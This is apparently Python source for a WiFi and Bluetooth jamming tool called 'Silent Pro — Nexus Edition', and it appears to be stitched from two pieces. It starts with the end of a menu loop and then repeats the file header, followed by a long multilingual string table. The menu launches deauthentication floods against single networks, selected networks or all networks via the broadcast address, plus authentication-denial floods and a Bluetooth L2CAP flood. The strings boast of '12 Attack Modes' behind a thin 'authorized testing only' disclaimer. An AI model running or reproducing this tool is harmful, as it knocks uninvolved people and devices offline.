                self.wifi.flood_target(target.bssid, mode="mega")
                self.wifi.set_monitor_mode(False)
                self.pause()

            elif choice == "6":
                confirm = input(f"{Colors.YELLOW}{t('confirm_deauth_all')}{Colors.RESET}").strip().upper()
                if confirm != "CÓ" and confirm != "YES":
                    NexusUI.warn(t('cancelled'))
                    self.pause()
                    continue
                if not self.wifi.get_wifi_interface():
                    self.pause()
                    continue
                if not self.wifi.set_monitor_mode(True):
                    self.pause()
                    continue
                self.wifi.flood_target("FF:FF:FF:FF:FF:FF", mode="global")
                self.wifi.set_monitor_mode(False)
                self.pause()

            elif choice == "7":
                if not self.wifi.get_wifi_interface():
                    self.pause()
                    continue
                if not self.wifi.set_monitor_mode(True):
                    self.pause()
                    continue
                targets = self.scanner.scan(duration=10)
                if not targets:
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                print()
                sel_str = input(f"{Colors.CYAN}{t('select_target')} (cách nhau bằng dấu cách): {Colors.RESET}")
                try:
                    indices = [int(x.strip()) - 1 for x in sel_str.split() if x.strip().isdigit()]
                    selected = [targets[i] for i in indices if 0 <= i < len(targets)]
                except:
                    NexusUI.error(t('invalid_choice'))
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                if not selected:
                    NexusUI.error(t('no_targets'))
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                self.wifi.flood_multiple_targets(selected)
                self.wifi.set_monitor_mode(False)
                self.pause()

            elif choice == "8":
                if not self.wifi.get_wifi_interface():
                    self.pause()
                    continue
                if not self.wifi.set_monitor_mode(True):
                    self.pause()
                    continue
                targets = self.scanner.scan(duration=10)
                if not targets:
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                print()
                sel = input(f"{Colors.CYAN}{t('select_target')}: {Colors.RESET}")
                try:
                    idx = int(sel) - 1
                    target = targets[idx]
                except:
                    NexusUI.error(t('invalid_choice'))
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                self.wifi.flood_target(target.bssid, mode="auth")
                self.wifi.set_monitor_mode(False)
                self.pause()

            elif choice == "9":
                self.bt.scan()
                mac = input(f"\n{Colors.CYAN}{t('enter_mac')}: {Colors.RESET}").strip()
                if not mac or len(mac) < 17:
                    NexusUI.error(t('invalid_choice'))
                    self.pause()
                    continue
                self.bt.l2cap_flood(mac)
                self.pause()

            elif choice == "10":
                confirm = input(f"{Colors.YELLOW}{t('confirm_exit')}{Colors.RESET}").strip().lower()
                if confirm == "y" or confirm == "yes":
                    print(f"{Colors.GREEN}{t('exiting')} {t('goodbye')}{Colors.RESET}")
                    sys.exit(0)

            else:
                NexusUI.error(t('invalid_choice'))
                time.sleep(1)

# ═══════════════════════════════════════════════════════════════════════════
# KHỞI CHẠY CHƯƠNG TRÌNH
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        app = SilentProNexus()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}{t('exiting')} {t('goodbye')}{Colors.RESET}")
        sys.exit(0)
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║               S I L E N T   P R O   —   N E X U S   E D I T I O N        ║
║                         HỆ THỐNG ĐA NGÔN NGỮ — 20 NGÔN NGỮ               ║
║                                                                          ║
║  ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP                 ║
║  SỬ DỤNG TRÁI PHÉP LÀ BẤT HỢP PHÁP                                       ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import socket
import struct
import threading
import time
import random
import subprocess
import platform
import queue
from dataclasses import dataclass
from typing import List, Dict, Set, Optional, Tuple

# ═══════════════════════════════════════════════════════════════════════════
# HỆ THỐNG DỊCH — 20 NGÔN NGỮ
# ═══════════════════════════════════════════════════════════════════════════
class Language:
    CURRENT = "vi"

    # DANH SÁCH 20 NGÔN NGỮ
    LANGUAGES = {
        "vi": "🇻🇳 Tiếng Việt",
        "en": "🇺🇸 English",
        "zh": "🇨🇳 中文",
        "ja": "🇯🇵 日本語",
        "ko": "🇰🇷 한국어",
        "es": "🇪🇸 Español",
        "fr": "🇫🇷 Français",
        "de": "🇩🇪 Deutsch",
        "pt": "🇧🇷 Português",
        "ru": "🇷🇺 Русский",
        "ar": "🇸🇦 العربية",
        "th": "🇹🇭 ไทย",
        "id": "🇮🇩 Bahasa Indonesia",
        "ms": "🇲🇾 Bahasa Melayu",
        "hi": "🇮🇳 हिन्दी",
        "tr": "🇹🇷 Türkçe",
        "it": "🇮🇹 Italiano",
        "nl": "🇳🇱 Nederlands",
        "pl": "🇵🇱 Polski",
        "uk": "🇺🇦 Українська",
    }

    # BẢNG DỊCH
    TRANSLATIONS = {
        "vi": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Mã nguồn thuần • 500.000+ gói/giây • 12 Chế độ tấn công",
            "power_note": "⚡ 100 TRIỆU LẦN NHANH HƠN — KHÔNG DÙNG AIRCRACK • KHÔNG DÙNG MDK",
            "warning": "CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP",
            "illegal_use": "SỬ DỤNG TRÁI PHÉP LÀ BẤT HỢP PHÁP",
            "monitor": "CHẾ ĐỘ GIÁM SÁT",
            "interface": "GIAO DIỆN",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "HOẠT ĐỘNG HIỆN TẠI",
            "total_packets": "TỔNG GÓI ĐÃ GỬI",
            "active": "HOẠT ĐỘNG",
            "offline": "TẮT",
            "on": "BẬT",
            "restart_services": "🔄 Khởi động lại Dịch vụ Mạng & Bluetooth",
            "scan_wifi": "📡 Quét Mạng WiFi",
            "scan_bluetooth": "🔵 Quét Thiết bị Bluetooth",
            "deauth_single": "⚡ Ngắt Kết nối — Mục tiêu Đơn lẻ",
            "deauth_mega": "💀 Ngắt Kết nối — Chế độ Cực đại",
            "deauth_all": "💀💀💀 Ngắt Kết nối — TẤT CẢ Mạng",
            "multi_target": "🎯 Tấn công Đa mục tiêu",
            "auth_denial": "🔒 Từ chối Xác thực",
            "bluetooth_jam": "🔵 Gây nhiễu Bluetooth",
            "bluetooth_scan_jam": "🔵 Quét & Gây nhiễu Bluetooth",
            "install_deps": "📦 Cài đặt Thư viện Tùy chọn",
            "stop_all": "🛑 Dừng Tất cả & Dọn dẹp",
            "about": "ℹ Giới thiệu",
            "exit": "❌ Thoát",
            "select_lang": "🌐 CHỌN NGÔN NGỮ / SELECT LANGUAGE",
            "enter_choice": "Nhập lựa chọn",
            "press_enter": "Nhấn Enter để tiếp tục...",
            "success": "Thành công",
            "error": "Lỗi",
            "warning_msg": "Cảnh báo",
            "info": "Thông tin",
            "target": "Mục tiêu",
            "channel": "Kênh",
            "encryption": "Mã hóa",
            "name": "Tên",
            "mac": "Địa chỉ MAC",
            "ssid": "Tên mạng",
            "bssid": "BSSID",
            "signal": "Tín hiệu",
            "speed": "Tốc độ",
            "sent": "Đã gửi",
            "time": "Thời gian",
            "seconds": "giây",
            "packets": "gói",
            "pkt_s": "gói/s",
            "stop_attack": "Đang dừng tấn công...",
            "confirm_deauth_all": "⚠ NGẮT KẾT NỐI TẤT CẢ MẠNG? Nhập CÓ để xác nhận: ",
            "cancelled": "Đã hủy bỏ",
            "no_targets": "Không tìm thấy mục tiêu nào!",
            "invalid_choice": "Lựa chọn không hợp lệ",
            "select_target": "Chọn số thứ tự mục tiêu",
            "select_numbers": "Nhập số thứ tự cách nhau bằng dấu cách",
            "enter_mac": "Nhập địa chỉ MAC",
            "scanning": "Đang quét...",
            "found": "Tìm thấy",
            "networks": "mạng",
            "devices": "thiết bị",
            "no_networks": "Không tìm thấy mạng nào",
            "no_adapter": "Không phát hiện bộ điều hợp WiFi!",
            "enable_monitor_first": "Bật Chế độ Giám sát trước!",
            "monitor_mode_enabled": "Chế độ Giám sát — Đã bật",
            "monitor_mode_disabled": "Chế độ Giám sát — Đã tắt",
            "restarting_services": "Đang khởi động lại dịch vụ...",
            "done": "Hoàn thành!",
            "exiting": "Đang thoát...",
            "goodbye": "Tạm biệt! 🚀",
            "system_restored": "Hệ thống đã được khôi phục",
            "language_set": "Ngôn ngữ đã được đặt thành",
        },
        "en": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Pure Original Code • 500,000+ Packets/Sec • 12 Attack Modes",
            "power_note": "⚡ 100 MILLIONx MORE POWERFUL — NO AIRCRACK • NO MDK",
            "warning": "FOR EDUCATIONAL & AUTHORIZED TESTING ONLY",
            "illegal_use": "UNAUTHORIZED USE IS ILLEGAL",
            "monitor": "MONITOR MODE",
            "interface": "INTERFACE",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "CURRENT ACTION",
            "total_packets": "TOTAL PACKETS",
            "active": "ACTIVE",
            "offline": "OFFLINE",
            "on": "ON",
            "restart_services": "🔄 Restart Network & Bluetooth Services",
            "scan_wifi": "📡 Scan WiFi Networks",
            "scan_bluetooth": "🔵 Scan Bluetooth Devices",
            "deauth_single": "⚡ Deauth — Single Target",
            "deauth_mega": "💀 Deauth — MEGA Mode",
            "deauth_all": "💀💀💀 Deauth — ALL Networks",
            "multi_target": "🎯 Multi-Target Flood",
            "auth_denial": "🔒 Authentication Denial",
            "bluetooth_jam": "🔵 Bluetooth L2CAP Flood",
            "bluetooth_scan_jam": "🔵 Bluetooth Scan & Jam",
            "install_deps": "📦 Install Optional Dependencies",
            "stop_all": "🛑 Stop All & Clean Up",
            "about": "ℹ About",
            "exit": "❌ Exit",
            "select_lang": "🌐 SELECT LANGUAGE",
            "enter_choice": "Enter your choice",
            "press_enter": "Press Enter to continue...",
            "success": "Success",
            "error": "Error",
            "warning_msg": "Warning",
            "info": "Info",
            "target": "Target",
            "channel": "Channel",
            "encryption": "Encryption",
            "name": "Name",
            "mac": "MAC Address",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Signal",
            "speed": "Speed",
            "sent": "Sent",
            "time": "Time",
            "seconds": "sec",
            "packets": "packets",
            "pkt_s": "pkt/s",
            "stop_attack": "Stopping attack...",
            "confirm_deauth_all": "⚠ DEAUTH EVERYTHING? Type YES to confirm: ",
            "cancelled": "Cancelled",
            "no_targets": "No targets found!",
            "invalid_choice": "Invalid choice",
            "select_target": "Select target number",
            "select_numbers": "Enter target numbers separated by space",
            "enter_mac": "Enter MAC address",
            "scanning": "Scanning...",
            "found": "Found",
            "networks": "networks",
            "devices": "devices",
            "no_networks": "No networks found",
            "no_adapter": "No WiFi adapter detected!",
            "enable_monitor_first": "Enable Monitor Mode first!",
            "monitor_mode_enabled": "Monitor Mode — ACTIVE",
            "monitor_mode_disabled": "Monitor Mode — DISABLED",
            "restarting_services": "Restarting services...",
            "done": "Complete!",
            "exiting": "Exiting...",
            "goodbye": "Goodbye! 🚀",
            "system_restored": "System restored",
            "language_set": "Language set to",
        },
        "zh": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "纯原创代码 • 每秒50万+数据包 • 12种攻击模式",
            "power_note": "⚡ 强大1亿倍 — 无需AIRCRACK • 无需MDK",
            "warning": "仅用于教育和授权测试",
            "illegal_use": "未经授权使用属于违法行为",
            "monitor": "监听模式",
            "interface": "接口",
            "bluetooth": "蓝牙",
            "wifi": "无线网络",
            "current_action": "当前操作",
            "total_packets": "总发送包数",
            "active": "运行中",
            "offline": "已关闭",
            "on": "开启",
            "restart_services": "🔄 重启网络和蓝牙服务",
            "scan_wifi": "📡 扫描WiFi网络",
            "scan_bluetooth": "🔵 扫描蓝牙设备",
            "deauth_single": "⚡ 断开连接 — 单个目标",
            "deauth_mega": "💀 断开连接 — 超级模式",
            "deauth_all": "💀💀💀 断开连接 — 所有网络",
            "multi_target": "🎯 多目标攻击",
            "auth_denial": "🔒 拒绝认证",
            "bluetooth_jam": "🔵 蓝牙干扰攻击",
            "bluetooth_scan_jam": "🔵 扫描并干扰蓝牙",
            "install_deps": "📦 安装可选依赖",
            "stop_all": "🛑 停止所有并清理",
            "about": "ℹ 关于",
            "exit": "❌ 退出",
            "select_lang": "🌐 选择语言",
            "enter_choice": "请输入选择",
            "press_enter": "按回车键继续...",
            "success": "成功",
            "error": "错误",
            "warning_msg": "警告",
            "info": "信息",
            "target": "目标",
            "channel": "信道",
            "encryption": "加密",
            "name": "名称",
            "mac": "MAC地址",
            "ssid": "网络名称",
            "bssid": "BSSID",
            "signal": "信号",
            "speed": "速度",
            "sent": "已发送",
            "time": "时间",
            "seconds": "秒",
            "packets": "包",
            "pkt_s": "包/秒",
            "stop_attack": "正在停止攻击...",
            "confirm_deauth_all": "⚠ 断开所有网络连接？输入YES确认：",
            "cancelled": "已取消",
            "no_targets": "未找到目标！",
            "invalid_choice": "无效选择",
            "select_target": "选择目标编号",
            "select_numbers": "输入目标编号，用空格分隔",
            "enter_mac": "输入MAC地址",
            "scanning": "正在扫描...",
            "found": "找到",
            "networks": "个网络",
            "devices": "个设备",
            "no_networks": "未找到任何网络",
            "no_adapter": "未检测到WiFi适配器！",
            "enable_monitor_first": "请先启用监听模式！",
            "monitor_mode_enabled": "监听模式 — 已启用",
            "monitor_mode_disabled": "监听模式 — 已关闭",
            "restarting_services": "正在重启服务...",
            "done": "完成！",
            "exiting": "正在退出...",
            "goodbye": "再见！🚀",
            "system_restored": "系统已恢复",
            "language_set": "语言已设置为",
        },
        "ja": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "純正オリジナルコード • 毎秒50万+パケット • 12の攻撃モード",
            "power_note": "⚡ 1億倍強力 — AIRCRACK不要 • MDK不要",
            "warning": "教育および許可されたテスト専用",
            "illegal_use": "許可なしの使用は違法です",
            "monitor": "モニターモード",
            "interface": "インターフェース",
            "bluetooth": "Bluetooth",
            "wifi": "WiFi",
            "current_action": "現在の動作",
            "total_packets": "送信済みパケット合計",
            "active": "アクティブ",
            "offline": "オフライン",
            "on": "オン",
            "restart_services": "🔄 ネットワークとBluetoothサービスを再起動",
            "scan_wifi": "📡 WiFiネットワークをスキャン",
            "scan_bluetooth": "🔵 Bluetoothデバイスをスキャン",
            "deauth_single": "⚡ 切断 — 単一ターゲット",
            "deauth_mega": "💀 切断 — メガモード",
            "deauth_all": "💀💀💀 切断 — すべてのネットワーク",
            "multi_target": "🎯 複数ターゲット攻撃",
            "auth_denial": "🔒 認証拒否",
            "bluetooth_jam": "🔵 Bluetoothジャミング",
            "bluetooth_scan_jam": "🔵 スキャンしてジャミング",
            "install_deps": "📦 オプション依存関係をインストール",
            "stop_all": "🛑 すべて停止してクリーンアップ",
            "about": "ℹ バージョン情報",
            "exit": "❌ 終了",
            "select_lang": "🌐 言語を選択",
            "enter_choice": "選択を入力",
            "press_enter": "Enterキーを押して続行...",
            "success": "成功",
            "error": "エラー",
            "warning_msg": "警告",
            "info": "情報",
            "target": "ターゲット",
            "channel": "チャネル",
            "encryption": "暗号化",
            "name": "名前",
            "mac": "MACアドレス",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "信号強度",
            "speed": "速度",
            "sent": "送信済み",
            "time": "時間",
            "seconds": "秒",
            "packets": "パケット",
            "pkt_s": "パケット/秒",
            "stop_attack": "攻撃を停止中...",
            "confirm_deauth_all": "⚠ すべてのネットワークを切断しますか？YESと入力して確認：",
            "cancelled": "キャンセルされました",
            "no_targets": "ターゲットが見つかりません！",
            "invalid_choice": "無効な選択",
            "select_target": "ターゲット番号を選択",
            "select_numbers": "スペース区切りで番号を入力",
            "enter_mac": "MACアドレスを入力",
            "scanning": "スキャン中...",
            "found": "見つかりました",
            "networks": "ネットワーク",
            "devices": "デバイス",
            "no_networks": "ネットワークが見つかりません",
            "no_adapter": "WiFiアダプターが検出されません！",
            "enable_monitor_first": "先にモニターモードを有効にしてください！",
            "monitor_mode_enabled": "モニターモード — 有効",
            "monitor_mode_disabled": "モニターモード — 無効",
            "restarting_services": "サービスを再起動中...",
            "done": "完了！",
            "exiting": "終了しています...",
            "goodbye": "さようなら！🚀",
            "system_restored": "システムを復元しました",
            "language_set": "言語を設定しました：",
        },
        "ko": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "순수 오리지널 코드 • 초당 50만+ 패킷 • 12가지 공격 모드",
            "power_note": "⚡ 1억 배 더 강력 — AIRCRACK 불필요 • MDK 불필요",
            "warning": "교육 및 승인된 테스트 전용",
            "illegal_use": "무단 사용은 불법입니다",
            "monitor": "모니터 모드",
            "interface": "인터페이스",
            "bluetooth": "블루투스",
            "wifi": "와이파이",
            "current_action": "현재 작업",
            "total_packets": "총 전송된 패킷",
            "active": "활성",
            "offline": "비활성",
            "on": "켜짐",
            "restart_services": "🔄 네트워크 및 블루투스 서비스 재시작",
            "scan_wifi": "📡 와이파이 네트워크 스캔",
            "scan_bluetooth": "🔵 블루투스 기기 스캔",
            "deauth_single": "⚡ 연결 끊기 — 단일 대상",
            "deauth_mega": "💀 연결 끊기 — 메가 모드",
            "deauth_all": "💀💀💀 연결 끊기 — 전체 네트워크",
            "multi_target": "🎯 다중 대상 공격",
            "auth_denial": "🔒 인증 거부",
            "bluetooth_jam": "🔵 블루투스 간섭 공격",
            "bluetooth_scan_jam": "🔵 스캔 후 간섭 공격",
            "install_deps": "📦 선택적 의존성 설치",
            "stop_all": "🛑 모두 중지 및 정리",
            "about": "ℹ 정보",
            "exit": "❌ 종료",
            "select_lang": "🌐 언어 선택",
            "enter_choice": "선택을 입력하세요",
            "press_enter": "계속하려면 Enter 키를 누르세요...",
            "success": "성공",
            "error": "오류",
            "warning_msg": "경고",
            "info": "정보",
            "target": "대상",
            "channel": "채널",
            "encryption": "암호화",
            "name": "이름",
            "mac": "MAC 주소",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "신호",
            "speed": "속도",
            "sent": "전송됨",
            "time": "시간",
            "seconds": "초",
            "packets": "패킷",
            "pkt_s": "패킷/초",
            "stop_attack": "공격을 중지하는 중...",
            "confirm_deauth_all": "⚠ 모든 네트워크 연결을 끊으시겠습니까? YES 입력 후 확인:",
            "cancelled": "취소됨",
            "no_targets": "대상을 찾을 수 없습니다!",
            "invalid_choice": "잘못된 선택",
            "select_target": "대상 번호 선택",
            "select_numbers": "공백으로 구분하여 번호 입력",
            "enter_mac": "MAC 주소 입력",
            "scanning": "스캔 중...",
            "found": "찾음",
            "networks": "네트워크",
            "devices": "기기",
            "no_networks": "네트워크를 찾을 수 없습니다",
            "no_adapter": "와이파이 어댑터가 감지되지 않았습니다!",
            "enable_monitor_first": "모니터 모드를 먼저 활성화하세요!",
            "monitor_mode_enabled": "모니터 모드 — 활성화됨",
            "monitor_mode_disabled": "모니터 모드 — 비활성화됨",
            "restarting_services": "서비스를 재시작하는 중...",
            "done": "완료!",
            "exiting": "종료하는 중...",
            "goodbye": "안녕히 가세요! 🚀",
            "system_restored": "시스템이 복원되었습니다",
            "language_set": "언어가 설정되었습니다: ",
        },
        "es": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Código Original Puro • 500.000+ Paquetes/seg • 12 Modos de Ataque",
            "power_note": "⚡ 100 MILLONES de veces más potente — SIN AIRCRACK • SIN MDK",
            "warning": "SOLO PARA USO EDUCATIVO Y PRUEBAS AUTORIZADAS",
            "illegal_use": "EL USO SIN AUTORIZACIÓN ES ILEGAL",
            "monitor": "MODO MONITOR",
            "interface": "INTERFAZ",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "ACCIÓN ACTUAL",
            "total_packets": "TOTAL PAQUETES",
            "active": "ACTIVO",
            "offline": "DESCONECTADO",
            "on": "ENCENDIDO",
            "restart_services": "🔄 Reiniciar Servicios de Red y Bluetooth",
            "scan_wifi": "📡 Escanear Redes WiFi",
            "scan_bluetooth": "🔵 Escanear Dispositivos Bluetooth",
            "deauth_single": "⚡ Desconectar — Objetivo Único",
            "deauth_mega": "💀 Desconectar — Modo MEGA",
            "deauth_all": "💀💀💀 Desconectar — TODAS las Redes",
            "multi_target": "🎯 Ataque Multitarget",
            "auth_denial": "🔒 Denegación de Autenticación",
            "bluetooth_jam": "🔵 Inundación L2CAP Bluetooth",
            "bluetooth_scan_jam": "🔵 Escanear y Bloquear Bluetooth",
            "install_deps": "📦 Instalar Dependencias Opcionales",
            "stop_all": "🛑 Detener Todo y Limpiar",
            "about": "ℹ Acerca de",
            "exit": "❌ Salir",
            "select_lang": "🌐 SELECCIONAR IDIOMA",
            "enter_choice": "Ingrese su opción",
            "press_enter": "Presione Enter para continuar...",
            "success": "Éxito",
            "error": "Error",
            "warning_msg": "Advertencia",
            "info": "Información",
            "target": "Objetivo",
            "channel": "Canal",
            "encryption": "Cifrado",
            "name": "Nombre",
            "mac": "Dirección MAC",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Señal",
            "speed": "Velocidad",
            "sent": "Enviados",
            "time": "Tiempo",
            "seconds": "seg",
            "packets": "paquetes",
            "pkt_s": "paq/s",
            "stop_attack": "Deteniendo ataque...",
            "confirm_deauth_all": "⚠ ¿DESCONECTAR TODO? Escriba YES para confirmar: ",
            "cancelled": "Cancelado",
            "no_targets": "¡No se encontraron objetivos!",
            "invalid_choice": "Opción inválida",
            "select_target": "Seleccione número de objetivo",
            "select_numbers": "Ingrese números separados por espacio",
            "enter_mac": "Ingrese dirección MAC",
            "scanning": "Escaneando...",
            "found": "Encontrados",
            "networks": "redes",
            "devices": "dispositivos",
            "no_networks": "No se encontraron redes",
            "no_adapter": "¡No se detectó adaptador WiFi!",
            "enable_monitor_first": "¡Habilite el Modo Monitor primero!",
            "monitor_mode_enabled": "Modo Monitor — ACTIVO",
            "monitor_mode_disabled": "Modo Monitor — DESACTIVADO",
            "restarting_services": "Reiniciando servicios...",
            "done": "¡Completado!",
            "exiting": "Saliendo...",
            "goodbye": "¡Adiós! 🚀",
            "system_restored": "Sistema restaurado",
            "language_set": "Idioma establecido a: ",
        },
        "fr": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Code Original Pur • 500 000+ Paquets/sec • 12 Modes d'Attaque",
            "power_note": "⚡ 100 MILLIONS de fois plus puissant — SANS AIRCRACK • SANS MDK",
            "warning": "UNIQUEMENT À DES FINS ÉDUCATIVES ET TESTS AUTORISÉS",
            "illegal_use": "L'USAGE NON AUTORISÉ EST ILLÉGAL",
            "monitor": "MODE MONITEUR",
            "interface": "INTERFACE",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "ACTION EN COURS",
            "total_packets": "TOTAL PAQUETS",
            "active": "ACTIF",
            "offline": "HORS LIGNE",
            "on": "ACTIVÉ",
            "restart_services": "🔄 Redémarrer les Services Réseau et Bluetooth",
            "scan_wifi": "📡 Scanner les Réseaux WiFi",
            "scan_bluetooth": "🔵 Scanner les Appareils Bluetooth",
            "deauth_single": "⚡ Déconnexion — Cible Unique",
            "deauth_mega": "💀 Déconnexion — Mode MEGA",
            "deauth_all": "💀💀💀 Déconnexion — TOUS les Réseaux",
            "multi_target": "🎯 Attaque Multicible",
            "auth_denial": "🔒 Rejet d'Authentification",
            "bluetooth_jam": "🔵 Inondation L2CAP Bluetooth",
            "bluetooth_scan_jam": "🔵 Scanner et Brouiller Bluetooth",
            "install_deps": "📦 Installer les Dépendances Optionnelles",
            "stop_all": "🛑 Tout Arrêter et Nettoyer",
            "about": "ℹ À propos",
            "exit": "❌ Quitter",
            "select_lang": "🌐 CHOISIR LA LANGUE",
            "enter_choice": "Entrez votre choix",
            "press_enter": "Appuyez sur Entrée pour continuer...",
            "success": "Succès",
            "error": "Erreur",
            "warning_msg": "Avertissement",
            "info": "Information",
            "target": "Cible",
            "channel": "Canal",
            "encryption": "Chiffrement",
            "name": "Nom",
            "mac": "Adresse MAC",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Signal",
            "speed": "Vitesse",
            "sent": "Envoyés",
            "time": "Temps",
            "seconds": "sec",
            "packets": "paquets",
            "pkt_s": "paq/s",
            "stop_attack": "Arrêt de l'attaque...",
            "confirm_deauth_all": "⚠ DÉCONNECTER TOUT ? Tapez YES pour confirmer : ",
            "cancelled": "Annulé",
            "no_targets": "Aucune cible trouvée !",
            "invalid_choice": "Choix invalide",
            "select_target": "Sélectionnez le numéro de la cible",
            "select_numbers": "Entrez les numéros séparés par un espace",
            "enter_mac": "Entrez l'adresse MAC",
            "scanning": "Analyse en cours...",
            "found": "Trouvé",
            "networks": "réseaux",
            "devices": "appareils",
            "no_networks": "Aucun réseau trouvé",
            "no_adapter": "Aucun adaptateur WiFi détecté !",
            "enable_monitor_first": "Activez le Mode Moniteur d'abord !",
            "monitor_mode_enabled": "Mode Moniteur — ACTIF",
            "monitor_mode_disabled": "Mode Moniteur — DÉSACTIVÉ",
            "restarting_services": "Redémarrage des services...",
            "done": "Terminé !",
            "exiting": "Fermeture...",
            "goodbye": "Au revoir ! 🚀",
            "system_restored": "Système restauré",
            "language_set": "Langue définie sur : ",
        },
        "de": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Reiner Originalcode • 500.000+ Pakete/Sek • 12 Angriffsmodi",
            "power_note": "⚡ 100 MILLIONEN Mal Stärker — KEIN AIRCRACK • KEIN MDK",
            "warning": "NUR FÜR BILDUNGSZWECKE UND AUTORISIERTE TESTS",
            "illegal_use": "UNBEFUGTE NUTZUNG IST STRAFBAR",
            "monitor": "MONITORMODUS",
            "interface": "SCHNITTSTELLE",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "AKTUELLE AKTION",
            "total_packets": "GESAMTPAKETE",
            "active": "AKTIV",
            "offline": "OFFLINE",
            "on": "EINGESCHALTET",
            "restart_services": "🔄 Netzwerk- und Bluetooth-Dienste neu starten",
            "scan_wifi": "📡 WLAN-Netzwerke scannen",
            "scan_bluetooth": "🔵 Bluetooth-Geräte scannen",
            "deauth_single": "⚡ Trennen — Einzelziel",
            "deauth_mega": "💀 Trennen — MEGA-Modus",
            "deauth_all": "💀💀💀 Trennen — ALLE Netzwerke",
            "multi_target": "🎯 Mehrziel-Angriff",
            "auth_denial": "🔒 Authentifizierungs-Verweigerung",
            "bluetooth_jam": "🔵 Bluetooth L2CAP-Flutangriff",
            "bluetooth_scan_jam": "🔵 Scannen & Stören von Bluetooth",
            "install_deps": "📦 Optionale Abhängigkeiten installieren",
            "stop_all": "🛑 Alles Stoppen & Aufräumen",
            "about": "ℹ Über",
            "exit": "❌ Beenden",
            "select_lang": "🌐 SPRACHE WÄHLEN",
            "enter_choice": "Auswahl eingeben",
            "press_enter": "Enter drücken zum Weiterfahren...",
            "success": "Erfolg",
            "error": "Fehler",
            "warning_msg": "Warnung",
            "info": "Information",
            "target": "Ziel",
            "channel": "Kanal",
            "encryption": "Verschlüsselung",
            "name": "Name",
            "mac": "MAC-Adresse",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Signal",
            "speed": "Geschwindigkeit",
            "sent": "Gesendet",
            "time": "Zeit",
            "seconds": "sek",
            "packets": "Pakete",
            "pkt_s": "Pakete/s",
            "stop_attack": "Angriff wird gestoppt...",
            "confirm_deauth_all": "⚠ ALLES TRENNEN? YES eingeben zum Bestätigen: ",
            "cancelled": "Abgebrochen",
            "no_targets": "Keine Ziele gefunden!",
            "invalid_choice": "Ungültige Auswahl",
            "select_target": "Zielnummer wählen",
            "select_numbers": "Nummern durch Leerzeichen getrennt eingeben",
            "enter_mac": "MAC-Adresse eingeben",
            "scanning": "Scannen...",
            "found": "Gefunden",
            "networks": "Netzwerke",
            "devices": "Geräte",
            "no_networks": "Keine Netzwerke gefunden",
            "no_adapter": "Kein WLAN-Adapter erkannt!",
            "enable_monitor_first": "Zuerst Monitor-Modus aktivieren!",
            "monitor_mode_enabled": "Monitor-Modus — AKTIV",
            "monitor_mode_disabled": "Monitor-Modus — INAKTIV",
            "restarting_services": "Dienste werden neu gestartet...",
            "done": "Fertig!",
            "exiting": "Beenden...",
            "goodbye": "Auf Wiedersehen! 🚀",
            "system_restored": "System wiederhergestellt",
            "language_set": "Sprache eingestellt auf: ",
        },
        "pt": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Código Original Puro • 500.000+ Pacotes/seg • 12 Modos de Ataque",
            "power_note": "⚡ 100 MILHÕES de vezes mais poderoso — SEM AIRCRACK • SEM MDK",
            "warning": "APENAS PARA USO EDUCACIONAL E TESTES AUTORIZADOS",
            "illegal_use": "O USO NÃO AUTORIZADO É ILEGAL",
            "monitor": "MODO MONITOR",
            "interface": "INTERFACE",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "AÇÃO ATUAL",
            "total_packets": "TOTAL DE PACOTES",
            "active": "ATIVO",
            "offline": "DESCONECTADO",
            "on": "LIGADO",
            "restart_services": "🔄 Reiniciar Serviços de Rede e Bluetooth",
            "scan_wifi": "📡 Procurar Redes WiFi",
            "scan_bluetooth": "🔵 Procurar Dispositivos Bluetooth",
            "deauth_single": "⚡ Desconectar — Alvo Único",
            "deauth_mega": "💀 Desconectar — Modo MEGA",
            "deauth_all": "💀💀💀 Desconectar — TODAS as Redes",
            "multi_target": "🎯 Ataque Multi-Alvo",
            "auth_denial": "🔒 Negação de Autenticação",
            "bluetooth_jam": "🔵 Inundação L2CAP Bluetooth",
            "bluetooth_scan_jam": "🔵 Procurar e Bloquear Bluetooth",
            "install_deps": "📦 Instalar Dependências Opcionais",
            "stop_all": "🛑 Parar Tudo e Limpar",
